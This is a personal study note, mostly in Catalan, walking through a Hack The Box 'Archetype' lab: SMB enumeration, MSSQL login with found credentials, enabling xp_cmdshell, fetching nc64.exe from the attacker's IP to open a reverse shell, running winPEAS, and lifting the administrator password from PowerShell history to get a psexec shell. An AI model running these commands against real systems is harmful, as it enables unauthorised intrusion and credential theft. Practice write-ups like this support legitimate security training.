# Intro
| Dificulty | OS | Start Date | End Date | Help? |
|---|---|---|---|---|
| Very Easy | Windows | 26/05/2022 | 28/05/2022 | Yes |


# Thought process
1. Common enumeration
2. Check `smbclient`
3. 




# smbclient
> Check Samba Server from Linux
```bash
$ smbclient -N -L @Target_IP
```
[-N]: Suppresess the normal password prompt from the client to the user
[-L]: List what services are aviable



```
smbclient \\\\@IP\\folder_name
```

https://tldp.org/HOWTO/SMB-HOWTO-8.html

get file_name
[//]: La ruta es desde on has executat la terminal de Kali

```
~/HTB/impacket/examples
└─$ python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.90.161 -windows-auth
```

un cop en el server, s'ha de permettre `enable_xp_cmdshell` perque despres farem comandos de windows al servidor.

???perque collons ers lo de responder





# FINDS
ARCHETYPE\sql_svc = M3g4c0rp123

mssqlclient.py (Estavlir conexio autentificada amb el servidor SQL)
xp_cmdshell (Executar Consola de Comandos de Windows en Microsoft SQL)
winpeas (Privilegie Escalation)

---
# Archetype
https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

username: dbo
system_user: sql_svc

> Veure quin rol tenim
```SQL
SQL> SELECT is_srvrolemember('sysadmin');
```
1 --> True

> Llistar Databases
```sql
SQL> EXEC sp_databases;
```


> Execució de commandes
```sql
SQL> EXEC xp_cmdshell ‘net user’;

SQL> EXEC sp_configure ‘show advanced options’, 1; — priv

SQL> RECONFIGURE; — priv

SQL> EXEC sp_configure ‘xp_cmdshell’, 1; — priv

SQL> RECONFIGURE; — priv
```
[priv]: S'han d'executatr amb usuari que tingui permisos d'admin

!! Com que ja podem executar commandes, intentarem executar una reverse shell. (nc64.exe)

> Escoltar port 80 local (Python)
```bash
$ sudo python3 -m http.server 80
```

> Escoltar port 80 local (netcat)
```bash
$ sudo nc -lvnp 443
```

?¿ Quina és la diferencia

> Saber directori del server
```sql
SQL> xp_cmdshell "powershell -c pwd";
```


En aquest directori no hi ha permisos d'execucció per l'usuari sql_svc així que haurem d'utilitzar el alguna ruta del seu directori.
Després fem la petició de la reverse shell que tenim en local.

> Canvi de directori i Reverse Shell
```sql
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.123/nc64.exe -outfile nc64.exe"
```

Podrem observar que el python que tenim escoltant al port 80 ha rebut una petició de GET.

> Solicitar cmd com a reverse shell al Local
```sql
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.123 443"
```

El netcat ja haurà rebut la petició de la reverse shell al port 443

![[Pasted image 20220528174933.png]]


Busquem la flag en el sistema i amb un `more` llegim el contingut

---

# Privilegie Escalation
Utilitzarem l'eina WinPeas. Primer descarreguem en local i despres la solicitem desde la màquina. 
(Continuar fent escolta en el port 80 amb python)
[Link descarrega](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe)

Executar escolta en port 80 desde l'ubicació on està el winPEAS. Fer `wget` de l'arxiu

```powershell
wget http://10.10.14.123/winPEASx64.exe -outfile winPEASx64.exe
```
[//]: S'ha d'estar en un directori on l'usuari tingui permissos.

Executem el binari utilitzant la reverse shell
```powershell
.\winPEASx64.exe
```

Podem observat que hi ha `SeImpersonatePrivilege` [Link](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) i aquest es vulnerable a "[juicy potato exploit](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato)". Però abans mirem si hi ha arxius que puguin contindre passwords.

Com que 'sql_svc' es un usuari normal, podem mirar el equivalent al '.bashrc' de powershell.
```powershell
cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
```

El fitxer conté la contrasenya de administrador.
administrator:MEGACORP_4dm1n!!

Ara podem executar `psexec.py` desde impacket per tenir una shell com Administrador.

```bash
$ python3 psexec.py administrator@Target_IP
```
![[Pasted image 20220528174919.png]]
La root flag es troba en el desktop de l'usuari










